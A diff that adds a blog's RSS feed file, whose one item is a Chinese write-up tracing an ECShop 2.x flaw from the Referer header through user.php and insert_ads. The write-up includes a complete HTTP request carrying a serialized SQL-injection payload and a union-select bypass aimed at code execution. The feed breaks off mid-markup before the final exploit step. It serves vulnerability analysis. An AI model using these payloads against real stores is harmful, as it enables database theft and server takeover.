@@ -1,0 +1,442 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Ecshop on iceH&#39;s Blog</title>
+        <link>https://360rce.github.io/tags/ecshop/</link>
+        <description>Recent content in Ecshop on iceH&#39;s Blog</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>zh-cn</language>
+        <copyright>本博客所有文章除特别声明外，均采用 CC BY-SA 4.0 协议 ，转载请注明出处！</copyright>
+        <lastBuildDate>Sun, 02 Sep 2018 11:42:19 +0000</lastBuildDate><atom:link href="https://360rce.github.io/tags/ecshop/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>ecshop2.x代码执行</title>
+        <link>https://360rce.github.io/p/vkxkois6/</link>
+        <pubDate>Sun, 02 Sep 2018 11:42:19 +0000</pubDate>
+        
+        <guid>https://360rce.github.io/p/vkxkois6/</guid>
+        <description>&lt;img src="https://w.wallhaven.cc/full/ex/wallhaven-ex277r.png" alt="Featured image of post ecshop2.x代码执行" /&gt;&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
+&lt;p&gt;问题发生在user.php的display函数，模版变量可控，导致注入，配合注入可达到远程代码执行&lt;/p&gt;
+&lt;h2 id=&#34;漏洞分析&#34;&gt;漏洞分析&lt;/h2&gt;
+&lt;h3 id=&#34;0x01-sql注入&#34;&gt;0x01-SQL注入&lt;/h3&gt;
+&lt;p&gt;先看user.php&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/vkxkois6/01.jpg&#34;
+	width=&#34;1283&#34;
+	height=&#34;444&#34;
+	srcset=&#34;https://360rce.github.io/p/vkxkois6/01_huc92c3150d4afad1a308be1f9c6ba73fa_48005_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/vkxkois6/01_huc92c3150d4afad1a308be1f9c6ba73fa_48005_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;ecshop2.x代码执行&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;288&#34;
+		data-flex-basis=&#34;693px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;$back_act变量来源于HTTP_REFERER，我们可控。&lt;/p&gt;
+&lt;p&gt;assign函数用于在模版变量里赋值&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/vkxkois6/02.jpg&#34;
+	width=&#34;529&#34;
+	height=&#34;373&#34;
+	srcset=&#34;https://360rce.github.io/p/vkxkois6/02_hu73808b97b3c772fcd267ace789e5b89d_15513_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/vkxkois6/02_hu73808b97b3c772fcd267ace789e5b89d_15513_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;ecshop2.x代码执行&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;141&#34;
+		data-flex-basis=&#34;340px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;再看display函数&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/vkxkois6/03.jpg&#34;
+	width=&#34;576&#34;
+	height=&#34;444&#34;
+	srcset=&#34;https://360rce.github.io/p/vkxkois6/03_hu94ad3229953116c34d40e15b8731d23e_29136_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/vkxkois6/03_hu94ad3229953116c34d40e15b8731d23e_29136_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;ecshop2.x代码执行&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;129&#34;
+		data-flex-basis=&#34;311px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;读取user_passport.dwt模版文件内容，显示解析变量后的html内容，用_echash做分割，得到$k然后交给isnert_mod处理，由于_echash是默认的，不是随机生成的，所以$val内容可随意控制。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;再看insert_mod函数&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/vkxkois6/04.jpg&#34;
+	width=&#34;539&#34;
+	height=&#34;172&#34;
+	srcset=&#34;https://360rce.github.io/p/vkxkois6/04_hu663e7aa7ab14f545d8c97ba619076cab_12643_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/vkxkois6/04_hu663e7aa7ab14f545d8c97ba619076cab_12643_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;ecshop2.x代码执行&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;313&#34;
+		data-flex-basis=&#34;752px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;非常关键的一个地方，这里进行了动态调用&lt;/p&gt;
+&lt;p&gt;$val传入进来用|分割，参数传入进来时需要被序列化&lt;/p&gt;
+&lt;p&gt;再看include/lib_insert.php中的insert_ads函数&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/vkxkois6/05.jpg&#34;
+	width=&#34;1022&#34;
+	height=&#34;279&#34;
+	srcset=&#34;https://360rce.github.io/p/vkxkois6/05_huf52cb46660fa0ee5535bb5f2f8d950a9_37631_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/vkxkois6/05_huf52cb46660fa0ee5535bb5f2f8d950a9_37631_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;ecshop2.x代码执行&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;366&#34;
+		data-flex-basis=&#34;879px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;可以看到这里直接就能注入了&lt;/p&gt;
+&lt;p&gt;payload:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;GET&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;/user.php?act=login&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;l&#34;&gt;127.0.0.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;User-Agent&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;l&#34;&gt;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Accept&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;l&#34;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Accept-Language&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;l&#34;&gt;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Cookie&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;l&#34;&gt;PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Referer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;l&#34;&gt;554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&amp;#34;num&amp;#34;;s:72:&amp;#34;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&amp;#34;;s:2:&amp;#34;id&amp;#34;;i:1;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;l&#34;&gt;close&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;l&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Cache-Control&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;l&#34;&gt;max-age=0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/vkxkois6/06.jpg&#34;
+	width=&#34;1885&#34;
+	height=&#34;411&#34;
+	srcset=&#34;https://360rce.github.io/p/vkxkois6/06_hu6073c48fe64c55b404f97827bfc0ac52_79627_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/vkxkois6/06_hu6073c48fe64c55b404f97827bfc0ac52_79627_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;ecshop2.x代码执行&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;458&#34;
+		data-flex-basis=&#34;1100px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;0x02-代码执行&#34;&gt;0x02-代码执行&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/vkxkois6/07.jpg&#34;
+	width=&#34;536&#34;
+	height=&#34;138&#34;
+	srcset=&#34;https://360rce.github.io/p/vkxkois6/07_hufe7806acbd426f830b2a98b7c563378b_12915_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/vkxkois6/07_hufe7806acbd426f830b2a98b7c563378b_12915_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;ecshop2.x代码执行&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;388&#34;
+		data-flex-basis=&#34;932px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;继续看fetch函数&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/vkxkois6/08.jpg&#34;
+	width=&#34;722&#34;
+	height=&#34;520&#34;
+	srcset=&#34;https://360rce.github.io/p/vkxkois6/08_hu12c88a0dd96754719f536f16b79418be_39179_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/vkxkois6/08_hu12c88a0dd96754719f536f16b79418be_39179_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;ecshop2.x代码执行&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;138&#34;
+		data-flex-basis=&#34;333px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;追踪_eval函数&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/vkxkois6/09.jpg&#34;
+	width=&#34;374&#34;
+	height=&#34;159&#34;
+	srcset=&#34;https://360rce.github.io/p/vkxkois6/09_huef331a609ed0374d55e8b8f05560f451_8130_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/vkxkois6/09_huef331a609ed0374d55e8b8f05560f451_8130_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;ecshop2.x代码执行&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;235&#34;
+		data-flex-basis=&#34;564px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;$position_style变量来源于数据库中的查询结构&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/vkxkois6/10.jpg&#34;
+	width=&#34;742&#34;
+	height=&#34;222&#34;
+	srcset=&#34;https://360rce.github.io/p/vkxkois6/10_huea0f487d0c3865cc1d3a90ab3f54df4c_16121_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/vkxkois6/10_huea0f487d0c3865cc1d3a90ab3f54df4c_16121_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;ecshop2.x代码执行&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;334&#34;
+		data-flex-basis=&#34;802px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;然后我们继续构造SQL注入，因为这段sql操作 order by部分换行了截断不了 所以需要在id处构造注释来配合num进行union查询&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/vkxkois6/11.jpg&#34;
+	width=&#34;926&#34;
+	height=&#34;189&#34;
+	srcset=&#34;https://360rce.github.io/p/vkxkois6/11_huf5d00fb9781f1fccd7c291f8223389fd_30517_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/vkxkois6/11_huf5d00fb9781f1fccd7c291f8223389fd_30517_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;ecshop2.x代码执行&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;489&#34;
+		data-flex-basis=&#34;1175px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;payload&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ad_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;position_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;media_type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ad_link&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ad_code&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ad_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ad_width&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ad_height&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;position_style&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RAND&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rnd&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ecshop27&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ecs_ad&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;LEFT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;JOIN&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ecshop27&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ecs_ad_position&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;ON&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;position_id&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;position_id&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;enabled&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AND&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start_time&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;1535678679&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AND&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;end_time&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;1535678679&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AND&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;position_id&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;/*&amp;#39; ORDER BY rnd LIMIT */&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;-- -
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;函数中有一个判断&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/vkxkois6/12.jpg&#34;
+	width=&#34;598&#34;
+	height=&#34;148&#34;
+	srcset=&#34;https://360rce.github.io/p/vkxkois6/12_hu1b0df71f15554359eee7ba463dcf497d_8480_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/vkxkois6/12_hu1b0df71f15554359eee7ba463dcf497d_8480_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;ecshop2.x代码执行&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;404&#34;
+		data-flex-basis=&#34;969px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;我们 id传入’/*&lt;/p&gt;
+&lt;p&gt;num传入*/ union select 1,0x272f2a,3,4,5,6,7,8,9,10– -就能绕过了&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/vkxkois6/13.jpg&#34;
+	width=&#34;965&#34;
+	height=&#34;236&#34;
+	srcset=&#34;https://360rce.github.io/p/vkxkois6/13_hud69b0fc14fa51411a43f0dcb6094d305_55803_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/vkxkois6/13_hud69b0fc14fa51411a43f0dcb6094d305_55803_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;ecshop2.x代码执行&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;408&#34;
+		data-flex-basis=&#34;981px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;var_dump一下&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/vkxkois6/14.jpg&#34;
+	width=&#34;618&#34;
+	height=&#34;189&#34;
+	srcset=&#34;https://360rce.github.io/p/vkxkois6/14_hu9479d5cfe2725fe22efdb8f21fe80964_20840_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/vkxkois6/14_hu9479d5cfe2725fe22efdb8f21fe80964_20840_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;ecshop2.x代码执行&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;326&#34;
+		data-flex-basis=&#34;784px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/vkxkois6/15.jpg&#34;
+	width=&#34;935&#34;
+	height=&#34;289&#34;
+	srcset=&#34;https://360rce.github.io/p/vkxkois6/15_hud74254c3c952cf64279d29c8b86872d2_63158_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/vkxkois6/15_hud74254c3c952cf64279d29c8b86872d2_63158_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;ecshop2.x代码执行&#34;
+	
+	
